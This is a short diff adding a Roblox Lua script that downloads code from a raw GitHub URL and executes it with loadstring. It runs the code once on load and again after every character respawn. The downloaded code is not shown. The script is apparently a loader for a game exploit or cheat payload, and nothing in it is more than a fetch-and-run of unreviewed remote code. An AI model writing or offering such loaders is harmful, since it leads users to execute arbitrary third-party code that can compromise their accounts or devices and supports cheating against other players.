@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoriOzawa/idksuchnew/refs/heads/main/ranoveradeer"))()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+player.CharacterAdded:Connect(function()
+    task.wait(1)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoriOzawa/idksuchnew/refs/heads/main/ranoveradeer"))()
+end)
